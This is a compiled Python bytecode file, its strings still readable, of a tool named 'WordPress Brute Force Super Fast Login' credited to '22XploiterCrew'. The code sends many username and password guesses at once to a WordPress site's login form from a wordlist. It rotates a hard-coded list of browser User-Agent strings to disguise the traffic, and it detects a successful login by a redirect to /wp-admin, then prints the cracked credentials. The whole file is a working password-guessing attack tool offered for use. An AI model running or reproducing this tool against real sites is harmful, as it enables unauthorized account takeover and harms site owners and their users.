a
    H5�_2  �                
   @   s  d Z ddlZddlZddlZddlZddlZddlT ddlmZm	Z	 ddl
Z
ddlmZ ddlZddlZddlZddlZdd� Zg d�Ze
�
� Zd	aej�� Zej�e�Zej�e�Zd
e�e�fge_ e�!�  e�"�  dd� Z#dd� Z$dd� Z%dd� Z&dd� Z'd=dd�Z(e)dk�re�  eej*�+ej,�ddd�Z-e-j.ddddd � e-j.d!d"d#d$d%� e-j.d&e/d'd(� e-j.d)e/d*d(� e-�0� Z1e1j.d+d,dd-d.� e1j.d/d0dd1d.� e-�2� Z3e�4d2e3j5�Z6e6du �r�e$d3� �ze�7e3j5� g Z8e3j9�r
e3j:�s
e;d4� e'e3j5e3j<e3j9� n�e3j:�r�e#e3j:�Z=e� ��Z>e
�
� Ze=D ]*Z?e?�@d5�Z9e8�Ae>�Be'e3j5e3j<e9�� �q0e	e8�D ]:ZCeC�D� ZCe3jE�r�e;d6e3j<d7 eC � ne;d8dd9d:� �qdW d  � n1 �s�0    Y  e;e(e3j5�� W n: ej$jF�y�   e$d;� Y n eG�y
   e$d<� Y n0 dS )>zN
Author: RandsX@22XploiterCrew
Description: A Very Faster Login WordPress CMS
�    N)�*)�ThreadPoolExecutor�as_completed)�ArgumentParserc                   C   s   t ddd� t d� d S )Nz[H[J� ��endz�WordPress Brute Force Super Fast Login By 22XploiterCrew
Website : https://22xploitercrew.my.id
E-Mail  : dev@22xploitercrew.my.id
)�print� r
   r
   � WordPress-Brute-Force-Fast-Login�banner   s    r   )OzmMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4zmMozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zHMozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0zHMozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:31.0) Gecko/20100101 Firefox/31.0zfMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36z�Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53zDMozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckozmMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:30.0) Gecko/20100101 Firefox/30.0ziMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zmMozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zHMozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36z�Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36zLMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0zmMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36zAMozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36z�Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53zfMozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zAMozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0zHMozilla/5.0 (Windows NT 6.3; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0ziMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zLMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0zDMozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like GeckozuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2znMozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/538.46 (KHTML, like Gecko) Version/8.0 Safari/538.46zFMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)zyMozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zAMozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0zmMozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zGMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10z=Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like GeckozmMozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/6.1.5 Safari/537.77.4zDMozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0z�Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14zJMozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0z�Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53zuMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9zDMozilla/5.0 (X11; Linux x86_64; rv:30.0) Gecko/20100101 Firefox/30.0z�Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:31.0) Gecko/20100101 Firefox/31.0zHMozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0zfMozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:31.0) Gecko/20100101 Firefox/31.0zwMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14z?Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)zAMozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0zfMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zfMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36zHMozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0zHMozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36z�Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) GSA/4.1.0.31802 Mobile/11D257 Safari/9537.53zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:31.0) Gecko/20100101 Firefox/31.0zAMozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0zmMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36zHMozilla/5.0 (Windows NT 6.2; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0zgMozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36ziMozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36z�Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/36.0.1985.125 Chrome/36.0.1985.125 Safari/537.36zQMozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:30.0) Gecko/20100101 Firefox/30.0zpMozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Safari/600.1.3zxMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36�	/wp-adminz
User-agentc                 C   s6   zt | d�}W n" ty0   td|  d � Y n0 |S )N�rzfile "z" not found)�open�FileNotFoundError�error)�filename�filer
   r
   r   �openFiler   s
    r   c                 C   s   t d�| �� t�d� d S )Nz[41m[ERROR][00m {}
r   �r	   �format�os�_exit��msgr
   r
   r   r   x   s    r   c                 C   s   t d�| �� t�d� d S )Nz[43m[30m[WARNING][00m {}
r   r   r   r
   r
   r   �warning{   s    r   c                 C   s   | |d�}t j�|��d�S )N)�log�pwdzutf-8)�urllib�parseZ	urlencode�encode)�username�passwordZdataFormr
   r
   r   �form~   s    �r#   c                 C   s�   z>t �| d t||��}t�d|�� �r6t| ||� n|W S W nR tjj	y\   td� Y n6 t
jyv   td� Y n t
jy�   td� Y n0 d S )N�/r   zConnection errorzConnection timeoutzConnection refused)�requestsr   r#   �re�searchZgeturl�	completedr   r   �URLError�socketZtimeout)�urlr!   r"   Zresponser
   r
   r   �sending�   s    
r,   r   c                 C   s�   t �  t�� t }tddd� |dkr8|dkr8td� ntd� tdtt|�� d� td	t| �d
  � td| � td|� td|� td	t| �d
  � t�d� d S )Nz
target successfully completedz, r   r   zusername and password not foundzfound username and passwordzthe time it takes "zseconds"�=�   z
Target   :z
Username :z
Password :r   )	r   �time�startr	   �str�int�lenr   r   )r+   r!   r"   Zdurationr
   r
   r   r(   �   s    



r(   �__main__z2python3 %(prog)s url username [-p|-P] [-v VERBOSE]zFPlease check your target first so that the login process runs smoothly)�progZusageZepilogz-Vz	--version�versionz%(prog)s version 1.1)�actionr6   z-vz	--verbose�
store_truezDverbose mode/show username and password combination for each attempt)r7   �helpr+   zurl the target)�typer9   r!   zusername targetz-pz
--passwordzuse one word password)�metavarr9   z-Pz
--passlistzuse a few words passwordz"(http|https)://[\w-]+(.[\w-]+)+\S*zYou must insert the procotolzPlease wait . . .z
z	trying	: z::zPlease wait . . .T)r   �flushz-Error concurrent
Please check your target urlzSession cancelled)r   r   )H�__doc__r   r&   Zrandomr*   r4   �sysZconcurrent.futuresr   r   r/   �argparser   Zurllib.requestr   Zurllib.errorZurllib.parseZhttp.cookiejarZhttpr   Z	UserAgentr0   r   Z	cookiejarZ	CookieJarZ	cookieJarZrequestZHTTPCookieProcessorZcookieHandlerZbuild_openerr%   ZchoiceZ
addheaders�clearZclear_session_cookiesr   r   r   r#   r,   r(   �__name__�path�basename�__file__�parser�add_argumentr1   Zadd_mutually_exclusive_groupZpwnd�
parse_args�argsr'   r+   Zcheckr   Z	processedr"   Zpasslistr	   r!   r   Zexecutor�line�strip�appendZsubmitZprocess�result�verboser)   �KeyboardInterruptr
   r
   r
   r   �<module>   s�   Q


�


2